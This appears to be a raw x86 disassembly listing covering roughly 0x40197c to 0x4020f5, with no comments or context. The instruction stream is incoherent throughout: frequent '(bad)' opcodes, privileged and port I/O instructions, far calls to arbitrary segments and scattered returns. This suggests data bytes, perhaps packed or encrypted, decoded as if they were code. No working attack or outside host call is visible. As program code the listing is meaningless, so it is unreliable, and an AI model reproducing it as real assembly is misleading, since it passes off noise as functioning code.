  40197c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40197d:	sar    BYTE PTR [esi],0x48
  401980:	pushf  
  401981:	adc    DWORD PTR [eax-0x581c5756],esp
  401987:	out    0x1f,al
  401989:	mov    bh,0x3
  40198b:	pop    ebx
  40198c:	mov    edi,0x2bbf6b60
  401991:	jle    0x4019f6
  401993:	pop    ss
  401994:	icebp  
  401995:	test   DWORD PTR [eax-0x49],edi
  401998:	and    eax,0xd52ce4f9
  40199d:	sar    DWORD PTR [edi-0x3fc537b8],1
  4019a3:	adc    al,0xf4
  4019a5:	inc    edx
  4019a6:	cmp    al,0x9c
  4019a8:	int3   
  4019a9:	pop    ecx
  4019aa:	scas   eax,DWORD PTR es:[edi]
  4019ab:	(bad)  
  4019ac:	mov    edx,0xd0216b8a
  4019b1:	cmp    DWORD PTR [ebx+0x4a],edi
  4019b4:	data16 aad 0x7a
  4019b7:	cmp    al,0xc5
  4019b9:	and    edx,DWORD PTR [eax]
  4019bb:	jno    0x401975
  4019bd:	cdq    
  4019be:	xchg   edi,eax
  4019bf:	mov    BYTE PTR ds:0xb624877c,cl
  4019c5:	ror    BYTE PTR ds:[esi+0x116fcddd],1
  4019cc:	outs   dx,BYTE PTR ds:[esi]
  4019cd:	cli    
  4019ce:	inc    edi
  4019cf:	loopne 0x4019f2
  4019d1:	mov    eax,0x9d10fa0f
  4019d6:	push   esp
  4019d7:	scas   eax,DWORD PTR es:[edi]
  4019d8:	sub    dh,al
  4019da:	add    ah,BYTE PTR [edx+0x40b5f977]
  4019e0:	stos   BYTE PTR es:[edi],al
  4019e1:	(bad)  
  4019e2:	mov    esp,0x27f04596
  4019e7:	hlt    
  4019e8:	ret    0xaaf
  4019eb:	jge    0x401a39
  4019ed:	out    dx,al
  4019ee:	bnd ret 
  4019f0:	frstor [eax+eiz*8-0x25]
  4019f4:	or     bh,BYTE PTR fs:[ebp-0x58]
  4019f8:	jl     0x4019fd
  4019fa:	push   ecx
  4019fb:	ins    BYTE PTR es:[edi],dx
  4019fc:	jmp    0x2bb9c056
  401a01:	out    dx,eax
  401a02:	inc    esp
  401a03:	xchg   ebx,eax
  401a04:	sbb    BYTE PTR [ebp-0xc],0x80
  401a08:	sbb    al,0x3d
  401a0a:	add    cl,BYTE PTR [eax+0x23]
  401a0d:	(bad)  
  401a0e:	jmp    0xf081b6e1
  401a13:	dec    edx
  401a14:	adc    cl,bl
  401a16:	mov    al,ds:0xc74b2808
  401a1b:	in     al,dx
  401a1c:	jbe    0x4019db
  401a1e:	adc    eax,0xa54776d
  401a23:	and    BYTE PTR [ecx+ecx*2+0x2f8fc83],ah
  401a2a:	xchg   esi,eax
  401a2b:	and    eax,0x36fafe00
  401a30:	jno    0x4019eb
  401a32:	outs   dx,BYTE PTR ds:[esi]
  401a33:	shr    DWORD PTR [eax],1
  401a35:	test   BYTE PTR [esi-0x6f],bh
  401a38:	xor    esp,DWORD PTR [eax+edx*1+0x6176af70]
  401a3f:	out    dx,al
  401a40:	loope  0x401a0c
  401a42:	pop    ebx
  401a43:	pop    esi
  401a44:	xchg   edx,eax
  401a45:	jne    0x401a09
  401a47:	jbe    0x401a52
  401a49:	repz sbb esi,DWORD PTR [ecx+0x1c3bfc5]
  401a50:	sti    
  401a51:	push   esi
  401a52:	and    ecx,DWORD PTR [eax]
  401a54:	hlt    
  401a55:	jg     0x401abd
  401a57:	push   ecx
  401a58:	pop    ecx
  401a59:	sub    ecx,DWORD PTR [ebp+0x4f]
  401a5c:	fild   QWORD PTR [ecx+0x35]
  401a5f:	adc    BYTE PTR [edi],al
  401a61:	hlt    
  401a62:	and    BYTE PTR [ebp+0x98b9b99],0xd9
  401a69:	loopne 0x401ac9
  401a6b:	inc    edx
  401a6c:	xor    ebp,edx
  401a6e:	int    0x79
  401a70:	(bad)  
  401a71:	lods   eax,DWORD PTR ds:[esi]
  401a72:	push   edi
  401a73:	mov    dh,0xf8
  401a75:	sahf   
  401a76:	adc    al,0x6b
  401a78:	dec    esi
  401a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a7a:	jb     0x401abb
  401a7c:	neg    DWORD PTR [ebp-0x48]
  401a7f:	jbe    0x401af6
  401a81:	jbe    0x401b00
  401a83:	dec    ecx
  401a84:	pop    esp
  401a85:	cmp    eax,0xc1c1b8fe
  401a8a:	call   DWORD PTR [eiz*1-0x143c475]
  401a91:	ret    
  401a92:	mov    dl,0xd7
  401a94:	lds    esi,FWORD PTR [ebp+eax*4-0x17]
  401a98:	mov    eax,ds:0x4ce31587
  401a9d:	mov    bl,0xb7
  401a9f:	jl     0x401a9d
  401aa1:	dec    esi
  401aa2:	xchg   ecx,eax
  401aa3:	std    
  401aa4:	or     BYTE PTR [edx+eiz*4],dl
  401aa7:	or     al,0x12
  401aa9:	xchg   ebp,eax
  401aaa:	repz sub bh,bh
  401aad:	jge    0x401a84
  401aaf:	call   0xfe5ca93a
  401ab4:	and    DWORD PTR [edi+edx*8-0x77],esp
  401ab8:	in     al,dx
  401ab9:	inc    eax
  401aba:	es mov edi,0x300d0835
  401ac0:	(bad)  
  401ac1:	imul   edi,DWORD PTR [ebx-0x21],0x14
  401ac5:	fldenv [ecx+0x7]
  401ac8:	push   0xffffff93
  401aca:	dec    edx
  401acb:	jecxz  0x401a5c
  401acd:	ror    eax,0x60
  401ad0:	cmp    DWORD PTR [eax],ebp
  401ad2:	(bad)  
  401ad3:	or     ecx,DWORD PTR [edx-0x13]
  401ad6:	add    DWORD PTR [esi],0xffffffd7
  401ad9:	adc    dl,al
  401adb:	inc    eax
  401adc:	add    eax,0xbff39258
  401ae1:	adc    eax,0x4f53dc
  401ae6:	gs jne 0x401aa8
  401ae9:	out    dx,eax
  401aea:	clc    
  401aeb:	push   0x132a6e60
  401af0:	(bad)  
  401af1:	and    eax,0xd78dbf4b
  401af6:	cmp    DWORD PTR [ebx-0x34ee6748],ebp
  401afc:	aas    
  401afd:	push   0x5d
  401aff:	lock ror BYTE PTR [eax],0x40
  401b03:	push   ss
  401b04:	(bad)  
  401b05:	xchg   esi,eax
  401b06:	sub    al,BYTE PTR [ebp+0x42]
  401b09:	pop    es
  401b0a:	and    al,0x44
  401b0c:	retf   0x1a57
  401b0f:	adc    eax,DWORD PTR [ebx+edx*8]
  401b12:	inc    eax
  401b13:	cmp    eax,DWORD PTR ds:0xd61ea277
  401b19:	add    ebp,DWORD PTR [ecx+0x19e98ab]
  401b1f:	inc    ebp
  401b20:	and    DWORD PTR [ebp+0x31],ecx
  401b23:	iret   
  401b24:	xchg   edx,eax
  401b25:	cwde   
  401b26:	pop    ss
  401b27:	adc    BYTE PTR [edx-0x2313ad2d],0x29
  401b2e:	and    edi,DWORD PTR ds:0xd9d04768
  401b34:	add    DWORD PTR [eax],ebp
  401b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b37:	add    bl,bh
  401b39:	or     al,ch
  401b3b:	push   ecx
  401b3c:	ins    BYTE PTR es:[edi],dx
  401b3d:	or     eax,0x3e6a98c9
  401b42:	rcr    BYTE PTR [ebx-0x1b30fab9],0x18
  401b49:	pop    ecx
  401b4a:	jle    0x401b92
  401b4c:	and    esi,DWORD PTR [ebx+0x1d6609ed]
  401b52:	dec    ecx
  401b53:	dec    edx
  401b54:	xchg   edx,eax
  401b55:	cdq    
  401b56:	sbb    esp,DWORD PTR [eax]
  401b58:	xchg   ebp,eax
  401b59:	mov    ds:0x3da90783,al
  401b5e:	enter  0xa173,0x1f
  401b62:	add    eax,0x840a0f20
  401b67:	outs   dx,DWORD PTR ds:[esi]
  401b68:	mov    edx,0x707debb3
  401b6d:	adc    al,0x52
  401b6f:	lahf   
  401b70:	sahf   
  401b71:	push   esi
  401b72:	dec    edx
  401b73:	shl    BYTE PTR [edx],0x1e
  401b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b77:	sahf   
  401b78:	scas   eax,DWORD PTR es:[edi]
  401b79:	stos   BYTE PTR es:[edi],al
  401b7a:	cs jle 0x401bbb
  401b7d:	ret    
  401b7e:	cli    
  401b7f:	imul   esp,esp,0xf380e5b9
  401b85:	push   ebp
  401b86:	pop    edx
  401b87:	jo     0x401b36
  401b89:	mov    cl,bh
  401b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b8c:	mov    ebp,0x4bf79d1
  401b91:	aaa    
  401b92:	dec    DWORD PTR [ecx]
  401b94:	push   ecx
  401b95:	sbb    eax,0xb4404984
  401b9a:	in     eax,dx
  401b9b:	pop    eax
  401b9c:	rcl    DWORD PTR [eax],cl
  401b9e:	loopne 0x401b77
  401ba0:	and    eax,0x454f3458
  401ba5:	ror    DWORD PTR [eax],0x8
  401ba8:	cs push es
  401baa:	jl     0x401bc9
  401bac:	inc    ebp
  401bad:	cmp    edi,esi
  401baf:	pop    ecx
  401bb0:	fcmovb st,st(6)
  401bb2:	mov    al,0x6c
  401bb4:	ja     0x401c2a
  401bb6:	pop    ebp
  401bb7:	in     eax,dx
  401bb8:	(bad)  
  401bb9:	mov    al,ds:0xfaeb4cab
  401bbe:	pushf  
  401bbf:	pushf  
  401bc0:	retf   0xdda0
  401bc3:	mov    ch,0x78
  401bc5:	(bad)  
  401bc6:	imul   eax,DWORD PTR [eax+0x25cb4aa8],0x6fc12787
  401bd0:	adc    BYTE PTR [edi-0x1a],ah
  401bd3:	les    esp,FWORD PTR [ebp-0x1c]
  401bd6:	cmp    al,BYTE PTR [eax+0x5b]
  401bd9:	xchg   ebp,ecx
  401bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bdc:	inc    esi
  401bdd:	xor    esi,DWORD PTR [esi]
  401bdf:	adc    BYTE PTR [ecx+esi*4+0x4b9f1b73],bh
  401be6:	aaa    
  401be7:	push   0x4d7720eb
  401bec:	inc    ebx
  401bed:	jbe    0x401bbe
  401bef:	sub    dl,BYTE PTR [edi-0x68]
  401bf2:	xchg   esp,eax
  401bf3:	dec    eax
  401bf4:	test   BYTE PTR [edi],bh
  401bf6:	dec    ecx
  401bf7:	call   0x757ac875
  401bfc:	add    DWORD PTR [ebx+ecx*2],ecx
  401bff:	xchg   ebx,eax
  401c00:	jecxz  0x401c7b
  401c02:	push   esi
  401c03:	sub    eax,0xab7a335d
  401c08:	add    dl,dh
  401c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c0b:	pop    esi
  401c0c:	rcr    DWORD PTR [eax-0x5f],0x3a
  401c10:	out    dx,al
  401c11:	adc    ecx,DWORD PTR [ebx-0x71]
  401c14:	pushf  
  401c15:	or     cl,0x8
  401c18:	push   edi
  401c19:	cwde   
  401c1a:	inc    esi
  401c1b:	sbb    ecx,edx
  401c1d:	call   0xdb64:0xb16588f5
  401c24:	aam    0xd8
  401c26:	jl     0x401c3c
  401c28:	and    edi,DWORD PTR [edx-0x1b96e3d8]
  401c2e:	sysexit 
  401c30:	cwde   
  401c31:	retfw  
  401c33:	or     al,bl
  401c35:	jo     0x401ca4
  401c37:	adc    DWORD PTR [ebx],ebx
  401c39:	xchg   edx,eax
  401c3a:	test   DWORD PTR [ebp+0x339a70b9],ebp
  401c40:	mov    WORD PTR [ecx-0x777e349],?
  401c46:	call   0xaa51:0x34b8456d
  401c4d:	or     al,0x80
  401c4f:	mov    bh,bl
  401c51:	or     eax,DWORD PTR [edx+0x41]
  401c54:	mov    edi,DWORD PTR [esi]
  401c56:	pop    es
  401c57:	xor    eax,0x58156a32
  401c5c:	lea    esi,[edx-0x5b]
  401c5f:	xlat   BYTE PTR ds:[ebx]
  401c60:	adc    eax,0x7b2d8a2d
  401c65:	mov    ds:0xec69989e,eax
  401c6a:	add    ebx,ebx
  401c6c:	jmp    0xee4095a6
  401c71:	repnz lods eax,DWORD PTR ds:[esi]
  401c73:	cwde   
  401c74:	nop
  401c75:	cmp    BYTE PTR [ebp+ebx*4-0x466a2566],al
  401c7c:	pop    ebx
  401c7d:	lock cld 
  401c7f:	xor    eax,0xfef264aa
  401c84:	out    dx,eax
  401c85:	stc    
  401c86:	sar    ecx,cl
  401c88:	push   0x4b
  401c8a:	ja     0x401c46
  401c8c:	pop    ebx
  401c8d:	ret    0x2a8
  401c90:	movd   DWORD PTR [edi],mm0
  401c93:	pop    di
  401c95:	mov    dl,0x90
  401c97:	pop    ebp
  401c98:	mov    al,0xd3
  401c9a:	mov    edx,0x9925c1cf
  401c9f:	pushf  
  401ca0:	adc    bl,BYTE PTR ds:0x228ba0fb
  401ca6:	inc    eax
  401ca7:	cmc    
  401ca8:	sbb    BYTE PTR [ebx-0xe],al
  401cab:	aaa    
  401cac:	out    0x63,al
  401cae:	jp     0x401ca2
  401cb0:	push   eax
  401cb1:	test   BYTE PTR [edx-0x21],bl
  401cb4:	in     eax,0x51
  401cb6:	pop    es
  401cb7:	or     al,0xb5
  401cb9:	fisubr WORD PTR ds:0xf061d2d6
  401cbf:	inc    ebp
  401cc0:	cdq    
  401cc1:	cld    
  401cc2:	xchg   DWORD PTR [ebx-0x105ba264],ecx
  401cc8:	cmp    ch,BYTE PTR [eax]
  401cca:	bound  ecx,QWORD PTR [ebp-0x83f4b6f]
  401cd0:	lods   al,BYTE PTR ds:[esi]
  401cd1:	mov    BYTE PTR [eax-0x2e1941af],cl
  401cd7:	pop    ecx
  401cd8:	mov    ebp,0xdb46f394
  401cdd:	sbb    edi,0xcb059c71
  401ce3:	ss pop edi
  401ce5:	stos   BYTE PTR es:[edi],al
  401ce6:	push   edi
  401ce7:	and    DWORD PTR [edx+0x54],esp
  401cea:	mov    edi,0x5fe30603
  401cef:	xchg   edx,eax
  401cf0:	mov    dh,0xe8
  401cf2:	out    dx,eax
  401cf3:	test   al,0x2e
  401cf5:	jo     0x401cfc
  401cf7:	iret   
  401cf8:	(bad)  
  401cf9:	xchg   ebx,eax
  401cfa:	ret    
  401cfb:	xlat   BYTE PTR ds:[ebx]
  401cfc:	mov    DWORD PTR [edi],ebp
  401cfe:	out    dx,al
  401cff:	add    al,0x43
  401d01:	pop    ss
  401d02:	push   eax
  401d03:	mov    eax,0x81fe6197
  401d08:	or     eax,0x194e2c63
  401d0d:	in     al,dx
  401d0e:	ret    
  401d0f:	jne    0x401cdd
  401d11:	pop    ss
  401d12:	ja     0x401d90
  401d14:	out    0xc,eax
  401d16:	push   edi
  401d17:	sbb    eax,0xa864456f
  401d1c:	sub    eax,0xf43832f6
  401d21:	mov    al,ds:0xbd4d18c4
  401d26:	lea    esi,[eax]
  401d28:	mov    ecx,esp
  401d2a:	stc    
  401d2b:	push   eax
  401d2c:	stos   BYTE PTR es:[edi],al
  401d2d:	rep ins DWORD PTR es:[edi],dx
  401d2f:	pop    esp
  401d30:	mov    ah,BYTE PTR [ecx]
  401d32:	jno    0x401d39
  401d34:	sub    ecx,DWORD PTR [esi+ecx*8-0x67]
  401d38:	lahf   
  401d39:	mov    ds:0xef76325b,eax
  401d3e:	(bad)  
  401d3f:	lahf   
  401d40:	outs   dx,DWORD PTR ds:[esi]
  401d41:	cdq    
  401d42:	ins    DWORD PTR es:[edi],dx
  401d43:	adc    eax,0x692cd31b
  401d48:	mov    dl,0x70
  401d4a:	aaa    
  401d4b:	es scas eax,DWORD PTR es:[edi]
  401d4d:	jge    0x401d92
  401d4f:	push   ebp
  401d50:	test   DWORD PTR [eax+0x9aba9c2],edi
  401d56:	(bad)  [edx-0x766c400]
  401d5c:	ins    BYTE PTR es:[edi],dx
  401d5d:	sub    dl,BYTE PTR [eax]
  401d5f:	(bad)  
  401d60:	call   0x656:0xf49c87c
  401d67:	call   0x1e21:0x37d2ebe3
  401d6e:	dec    esp
  401d6f:	ja     0x401d58
  401d71:	rcr    DWORD PTR [edi+0x7a2b54d3],0xbc
  401d78:	stos   BYTE PTR es:[edi],al
  401d79:	or     esi,DWORD PTR [ebp+0x2771fd2c]
  401d7f:	lds    edi,FWORD PTR [edi+ecx*8]
  401d82:	sub    al,BYTE PTR ds:0xe3e0820b
  401d88:	mov    ch,0xd7
  401d8a:	add    esi,DWORD PTR [edi+0x59a6791e]
  401d90:	je     0x401d45
  401d92:	sbb    BYTE PTR [edx],al
  401d94:	hlt    
  401d95:	adc    DWORD PTR [edi],esp
  401d97:	imul   ebp,DWORD PTR [esi+ebx*8+0x66],0xffffffd1
  401d9c:	inc    esp
  401d9d:	jmp    0x9732:0xbb867534
  401da4:	test   eax,0x649eeab9
  401da9:	retf   0xf3d1
  401dac:	mov    al,0xd
  401dae:	and    eax,0xe14eccc6
  401db3:	cmc    
  401db4:	or     al,0x37
  401db6:	iret   
  401db7:	push   edi
  401db8:	fadd   QWORD PTR gs:[ebx+0x6c]
  401dbc:	cli    
  401dbd:	fsub   QWORD PTR [ecx-0x531c7c4]
  401dc3:	stc    
  401dc4:	mov    bl,0xad
  401dc6:	adc    bh,cl
  401dc8:	adc    BYTE PTR [edx],al
  401dca:	dec    ebx
  401dcb:	sub    al,0xdc
  401dcd:	jge    0x401d97
  401dcf:	scas   eax,DWORD PTR es:[edi]
  401dd0:	xchg   ebx,eax
  401dd1:	xor    esp,DWORD PTR [edi-0x78]
  401dd4:	pop    ss
  401dd5:	test   eax,0x1728e2a2
  401dda:	ss push ss
  401ddc:	icebp  
  401ddd:	sub    DWORD PTR [esi+0x17],0x38
  401de1:	add    eax,0x9db20aae
  401de6:	div    BYTE PTR [ecx-0x8665d89]
  401dec:	dec    ebx
  401ded:	sub    eax,0x276318fd
  401df2:	dec    edx
  401df3:	das    
  401df4:	jo     0x401dfd
  401df6:	(bad)  
  401df8:	dec    ecx
  401df9:	cmp    BYTE PTR [eax-0x36],0xba
  401dfd:	add    DWORD PTR [ebp+edi*4+0xa],ebx
  401e01:	sbb    al,BYTE PTR [edi+0x45dbb00b]
  401e07:	das    
  401e08:	mov    bl,0x57
  401e0a:	dec    edi
  401e0c:	jb     0x401e42
  401e0e:	sbb    dl,dl
  401e10:	inc    ebp
  401e11:	imul   edi,DWORD PTR [eax-0xe],0xcb97fcde
  401e18:	in     al,0x29
  401e1a:	stc    
  401e1b:	mov    al,0x43
  401e1d:	adc    al,0x7c
  401e1f:	xchg   ebx,eax
  401e20:	xor    BYTE PTR [edi+ebx*4-0x27],ah
  401e24:	outs   dx,BYTE PTR ds:[esi]
  401e25:	inc    ebp
  401e26:	xor    ebx,0x8e448455
  401e2c:	(bad)  
  401e2d:	addr16 icebp 
  401e2f:	enter  0xa80f,0xa
  401e33:	hlt    
  401e34:	add    BYTE PTR [edi-0x147aa183],cl
  401e3a:	add    esp,esi
  401e3c:	cmp    eax,0x76ea01e
  401e41:	call   0x4b73:0xda68ab80
  401e48:	pop    es
  401e49:	es push ecx
  401e4b:	popa   
  401e4c:	out    0xc,al
  401e4e:	lahf   
  401e4f:	test   BYTE PTR [eax+0x5044c1e6],0x34
  401e56:	jmp    0x401eba
  401e58:	pop    esi
  401e59:	imul   ebx,DWORD PTR [ebx+ecx*4],0xffffffe7
  401e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e5e:	pushf  
  401e5f:	adc    al,0x31
  401e61:	or     al,BYTE PTR [ebx+0x3b3262a8]
  401e67:	sbb    eax,0xec20e35a
  401e6c:	push   ebp
  401e6d:	ficom  DWORD PTR [esp+edx*2-0x4]
  401e71:	adc    al,0xdd
  401e73:	std    
  401e74:	inc    ebx
  401e75:	not    BYTE PTR [ecx]
  401e77:	xchg   ebx,eax
  401e78:	lea    edi,[ecx]
  401e7a:	leave  
  401e7b:	xchg   ebx,eax
  401e7c:	pop    esp
  401e7d:	xor    eax,ebp
  401e7f:	lods   al,BYTE PTR ds:[esi]
  401e80:	xor    DWORD PTR [eax],ebp
  401e82:	stos   BYTE PTR es:[edi],al
  401e83:	ins    BYTE PTR es:[edi],dx
  401e84:	outs   dx,DWORD PTR ds:[esi]
  401e85:	dec    ecx
  401e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e87:	ds adc eax,0xbe10e312
  401e8d:	jmp    0x7679611c
  401e92:	retf   0x1a97
  401e95:	and    ah,0xb
  401e98:	adc    DWORD PTR [edi+0x64819a50],eax
  401e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e9f:	outs   dx,BYTE PTR ds:[esi]
  401ea0:	fadd   DWORD PTR [edi+0x64]
  401ea3:	adc    BYTE PTR ds:[esi],dl
  401ea6:	add    edx,DWORD PTR [esp+ebp*1]
  401ea9:	clc    
  401eaa:	xor    al,0x86
  401eac:	and    DWORD PTR [ebx+esi*2+0x257dbcd6],ebp
  401eb3:	fidivr WORD PTR [ecx+edx*1-0x28]
  401eb7:	loope  0x401e66
  401eb9:	lahf   
  401eba:	inc    ecx
  401ebb:	enter  0xb768,0x43
  401ebf:	std    
  401ec0:	shr    DWORD PTR [edx-0x16],1
  401ec3:	aas    
  401ec4:	push   0x57
  401ec6:	mov    al,ds:0xb73c650a
  401ecb:	sar    BYTE PTR [ecx-0x57],cl
  401ece:	push   edi
  401ecf:	repz cld 
  401ed1:	js     0x401e6b
  401ed3:	ins    DWORD PTR es:[edi],dx
  401ed4:	jecxz  0x401ef6
  401ed6:	mov    DWORD PTR ds:0x8bd3ea0e,edx
  401edc:	sti    
  401edd:	xor    al,0x8a
  401edf:	mov    bh,0xb4
  401ee1:	(bad)  
  401ee3:	xchg   edi,eax
  401ee4:	dec    eax
  401ee5:	jl     0x401e8a
  401ee7:	imul   ecx,DWORD PTR [ecx+0x61],0xfffffff2
  401eeb:	mov    ebx,0x84dfe44
  401ef0:	cdq    
  401ef1:	fmul   QWORD PTR [edx]
  401ef3:	add    dl,BYTE PTR [ebx-0x67]
  401ef6:	pop    edx
  401ef7:	mov    ah,0x4a
  401ef9:	int    0x54
  401efb:	mov    bh,0x5d
  401efd:	lock retf 0xe4d7
  401f01:	xchg   ecx,eax
  401f02:	xor    eax,0xd81abc97
  401f07:	stc    
  401f08:	ret    
  401f09:	sbb    cl,dh
  401f0b:	lea    ebp,[esi+esi*8-0x1d]
  401f0f:	mov    esi,0xb53099b1
  401f14:	push   0x25
  401f16:	mov    ebp,0x2670af64
  401f1b:	(bad)  
  401f1c:	sti    
  401f1d:	push   0xfffffff0
  401f1f:	ror    DWORD PTR [eax+0x6],1
  401f22:	in     eax,dx
  401f23:	and    ecx,ecx
  401f25:	fsub   DWORD PTR [esi+ebp*8-0x20]
  401f29:	mov    ds:0x85d0e4f5,ax
  401f2f:	push   DWORD PTR [edx+ecx*8-0x30]
  401f33:	push   eax
  401f34:	shr    BYTE PTR [esi],0x21
  401f37:	(bad)  
  401f38:	pop    ebx
  401f39:	jl     0x401f1a
  401f3b:	adc    al,0x8d
  401f3d:	jl     0x401fb1
  401f3f:	jp     0x401f9b
  401f41:	aaa    
  401f42:	adc    BYTE PTR [ecx],ah
  401f44:	pusha  
  401f45:	jb     0x401ef3
  401f47:	push   edi
  401f48:	int3   
  401f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f4a:	daa    
  401f4b:	sbb    al,0x18
  401f4d:	(bad)  
  401f4e:	mov    edx,0xa43df3be
  401f53:	inc    edx
  401f54:	adc    BYTE PTR [esi+0x65],ch
  401f57:	sub    bl,BYTE PTR [ebp+0x3f]
  401f5a:	push   ds
  401f5b:	aad    0xc2
  401f5d:	(bad)  
  401f5e:	repz push ss
  401f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f61:	push   ebx
  401f62:	fild   QWORD PTR [ebx-0x3e07931b]
  401f68:	pop    eax
  401f69:	inc    eax
  401f6a:	(bad)  
  401f6b:	sub    edi,eax
  401f6d:	and    eax,0x24b2e6e1
  401f72:	cdq    
  401f73:	push   esi
  401f74:	ror    DWORD PTR [edx+eax*4-0x11],1
  401f78:	jmp    0x2c8744b4
  401f7d:	fwait
  401f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f7f:	lds    esi,FWORD PTR [eax-0x5298a3df]
  401f85:	inc    ebx
  401f86:	mov    dh,0x70
  401f88:	hlt    
  401f89:	(bad)  
  401f8b:	inc    edi
  401f8c:	iret   
  401f8d:	cmp    eax,0xce1084c6
  401f92:	aaa    
  401f93:	cdq    
  401f94:	or     dh,bh
  401f96:	xchg   ebx,eax
  401f97:	fstp   TBYTE PTR [esi-0x5b]
  401f9a:	test   eax,0x1aa4c2bb
  401f9f:	cmp    eax,0x9834f870
  401fa4:	test   BYTE PTR [ebx+0x37f94627],dh
  401faa:	aam    0x15
  401fac:	xchg   ebx,eax
  401fad:	add    esi,DWORD PTR [esp+ebx*4+0x53328015]
  401fb4:	inc    eax
  401fb5:	scas   eax,DWORD PTR es:[edi]
  401fb6:	enterw 0xec7,0xac
  401fbb:	mov    edx,0x8693a5be
  401fc0:	aad    0x5e
  401fc2:	xchg   DWORD PTR [ebx+eax*8-0x65509392],ecx
  401fc9:	xor    eax,0x135bfdf7
  401fce:	dec    ebx
  401fcf:	(bad)  
  401fd0:	std    
  401fd1:	outs   dx,BYTE PTR ds:[esi]
  401fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fd3:	mov    BYTE PTR [eax],dh
  401fd5:	(bad)  
  401fd6:	sub    DWORD PTR [ecx],ebx
  401fd8:	into   
  401fd9:	mov    ds:0xdf11f9c1,al
  401fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fdf:	jb     0x40205e
  401fe1:	jle    0x401ffd
  401fe3:	cmc    
  401fe4:	fisttp WORD PTR [edi]
  401fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fe7:	mov    esi,0x64c40d8a
  401fec:	add    al,bl
  401fee:	stc    
  401fef:	sub    DWORD PTR fs:[ebp+ebp*4+0x1515dba7],esi
  401ff7:	push   ecx
  401ff8:	cmp    al,0x64
  401ffa:	xchg   edi,eax
  401ffb:	and    eax,DWORD PTR [edi+0x2c]
  401ffe:	mov    dh,0x79
  402000:	in     al,dx
  402001:	fadd   QWORD PTR [esi]
  402003:	sbb    dh,BYTE PTR [esi]
  402005:	(bad)  
  402007:	push   esi
  402008:	imul   esp,ebp,0xef1d60ca
  40200e:	or     DWORD PTR [ecx-0x415fe57e],edi
  402014:	in     eax,dx
  402015:	cmp    eax,esp
  402017:	mov    BYTE PTR [eax-0x670e1d25],ch
  40201d:	les    eax,FWORD PTR [ebx-0x2]
  402020:	fiadd  WORD PTR ds:0x335cdbbb
  402026:	dec    ecx
  402027:	push   ds
  402028:	js     0x402033
  40202a:	rcr    BYTE PTR [edi-0x7b],cl
  40202d:	clc    
  40202e:	mov    eax,0x37de1dc7
  402033:	ja     0x40203e
  402035:	push   es
  402036:	jg     0x402034
  402038:	idiv   DWORD PTR [edx-0x63]
  40203b:	push   eax
  40203c:	lods   al,BYTE PTR ds:[esi]
  40203d:	(bad)  
  40203f:	cli    
  402040:	cmp    ebp,edx
  402042:	daa    
  402043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402044:	adc    DWORD PTR [esi],esp
  402046:	arpl   ax,di
  402048:	jb     0x402007
  40204a:	out    0xe1,eax
  40204c:	push   0xfffffff7
  40204e:	sbb    BYTE PTR [edx-0x68],bl
  402051:	outs   dx,BYTE PTR ds:[esi]
  402052:	outs   dx,DWORD PTR ds:[esi]
  402053:	inc    ebx
  402054:	xor    eax,0x424d7f25
  402059:	cmp    edi,DWORD PTR [ecx]
  40205b:	pop    es
  40205c:	cwde   
  40205d:	cwde   
  40205e:	lods   al,BYTE PTR ds:[esi]
  40205f:	add    eax,DWORD PTR [esi+0x41755377]
  402065:	daa    
  402066:	popa   
  402067:	xchg   ebp,eax
  402068:	or     DWORD PTR ds:0xdf170c9c,esi
  40206e:	shl    DWORD PTR [eax+0x6a],cl
  402071:	call   0x2ff:0x4808d2e
  402078:	push   ds
  402079:	mov    dh,0xa6
  40207b:	adc    bh,BYTE PTR [eax]
  40207d:	cmp    BYTE PTR [esp+esi*4-0x4180eb11],ah
  402084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402085:	je     0x40208f
  402087:	dec    eax
  402088:	js     0x40202b
  40208a:	jmp    0xc47877f5
  40208f:	lods   eax,DWORD PTR ds:[esi]
  402090:	jno    0x40204c
  402092:	rcr    DWORD PTR [edi],cl
  402094:	push   cs
  402095:	test   eax,0xdab2fb02
  40209a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40209b:	test   al,0xe3
  40209d:	jl     0x4020ee
  40209f:	rol    DWORD PTR [ebp-0x5e],1
  4020a2:	add    ch,BYTE PTR [edi+0x4b8c6e7b]
  4020a8:	pop    eax
  4020a9:	shl    BYTE PTR [ebp+0x1c],0x3a
  4020ad:	pop    edx
  4020ae:	and    ah,cl
  4020b0:	dec    edx
  4020b1:	add    eax,0xab10284e
  4020b6:	dec    eax
  4020b7:	inc    ebx
  4020b8:	and    eax,0x6fed042f
  4020bd:	jo     0x4020bd
  4020bf:	nop
  4020c0:	adc    eax,0xc1450135
  4020c5:	inc    edi
  4020c6:	stc    
  4020c7:	xchg   edi,eax
  4020c8:	mov    cs:0x3d7ba834,al
  4020ce:	fmul   DWORD PTR [edx+0x44a20baa]
  4020d4:	pop    esi
  4020d5:	add    eax,0x2fbf10ba
  4020da:	cmp    eax,0x92cdf476
  4020df:	shl    BYTE PTR [ebp-0x3f5efeb5],0xa3
  4020e6:	and    DWORD PTR [eax+ebp*1+0x55],eax
  4020ea:	mov    bl,0x6e
  4020ec:	sub    DWORD PTR [esi-0x38],edi
  4020ef:	push   esi
  4020f0:	imul   DWORD PTR [esi]
  4020f2:	pop    ebp
  4020f3:	shl    esp,1
  4020f5:	xchg   BYTE PTR [ebp+0x4e71da5c],ah
